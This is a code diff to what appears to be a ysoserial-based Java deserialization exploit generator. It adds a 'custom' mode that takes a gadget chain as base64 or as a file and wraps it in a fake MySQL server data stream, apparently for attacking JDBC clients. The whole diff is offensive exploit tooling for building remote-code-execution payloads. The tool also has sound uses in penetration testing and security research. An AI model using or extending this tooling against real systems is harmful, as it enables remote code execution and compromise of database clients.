@@ -8,7 +8,10 @@ import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 
 import java.io.ByteArrayOutputStream;
+import java.io.IOException;
 import java.io.PrintStream;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.*;
 import ch.qos.logback.classic.Logger;
 import ch.qos.logback.classic.Level;
@@ -57,6 +60,8 @@ public class GeneratePayload {
             String[] vlist = {"5","5.1","8"};
             String version = "";
             String user = "";
+            byte[] object = null;
+            byte[] mysqlData = null;
             if (parts.length == 2|| parts.length == 3) {
                  version = parts[1]; // [version]
                  user = parts.length == 3 ? parts[2] : "mysql";
@@ -70,7 +75,28 @@ public class GeneratePayload {
                 System.exit(USAGE_CODE);
             }
             FakeMySQLPipeFile fakeMySQLPipeFile = new FakeMySQLPipeFile(version, user);
-            byte[] object = fakeMySQLPipeFile.getObject(build(payloadType, command));
+            if (payloadType.equals("custom")) {
+                if (command.isEmpty() || command.matches("\\d+")) {
+                    System.err.println("!!! 输入错误, 请输入gadget的base64编码数据或者输入gadget文件的路径");
+                    System.exit(USAGE_CODE);
+                }
+                try {
+                    mysqlData = Base64.getDecoder().decode(command);
+                } catch (IllegalArgumentException e) {
+                    try {
+                        mysqlData = Files.readAllBytes(Paths.get(command));
+                    } catch (IOException io) {
+                        System.err.println("!!! 输入错误, 请输入gadget的base64编码数据或者输入gadget文件的路径");
+                        System.exit(USAGE_CODE);
+                    }
+                }
+                object = fakeMySQLPipeFile.getObject(mysqlData);
+                    PrintStream out = System.out;
+                    out.write(object);
+                    out.flush();
+                    System.exit(0);
+            }
+            object = fakeMySQLPipeFile.getObject(build(payloadType, command));
             PrintStream out = System.out;
             out.write(object);
             out.flush();
